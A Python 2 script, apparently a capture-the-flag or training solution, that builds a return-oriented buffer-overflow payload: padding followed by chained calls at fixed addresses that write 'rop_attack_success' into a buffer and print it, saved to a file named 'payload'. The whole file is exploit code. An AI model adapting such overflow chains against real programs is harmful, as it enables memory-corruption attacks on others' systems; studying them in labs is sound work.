#!/usr/bin/env python2


import struct
import subprocess as sp

def p32(n):
    return struct.pack("<I", n)


# Open flag, Read_flag, show_flag

FN_WRITE = 0x08048540
ADDR_WRITE = 0x0804889e #=POP-POP-RET
FN_PUTS = 0x8048550
BUF = 0x804a038

R = 0x80488ed
O = 0x80488ea
P = 0x80488eb
UNDER = 0x80488f6
A = 0x80488d0
T = 0x80488ef
C = 0x80488de
K = 0x80488e6
S = 0x80488d8
U = 0x80488f0
E = 0x80488d6
NULL = 0x80488f7

def get_payload():
    return "A" * 44	\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF)		\
	+ p32(R)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0x1)		\
	+ p32(O)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF +0x2)		\
	+ p32(P)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0x3)		\
	+ p32(UNDER)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0x4)		\
	+ p32(A)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0x5)		\
	+ p32(T)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0x6)		\
	+ p32(T)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0x7)		\
	+ p32(A)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0x8)		\
	+ p32(C)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0x9)		\
	+ p32(K)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0xa)		\
	+ p32(UNDER)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0xb)		\
	+ p32(S)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0xc)		\
	+ p32(U)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0xd)		\
	+ p32(C)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0xe)		\
	+ p32(C)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0xf)		\
	+ p32(E)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0x10)		\
	+ p32(S)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0x11)		\
	+ p32(S)		\
	+ p32(FN_WRITE)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF + 0x12)		\
	+ p32(NULL)		\
	+ p32(FN_PUTS)		\
	+ p32(ADDR_WRITE)	\
	+ p32(BUF)		\
	+ p32(BUF)		\
	+ 'AAAA'		\
	+ "\n"
        
if __name__ == '__main__':
    with open("payload","wb") as fw:
	fw.write(get_payload()) 
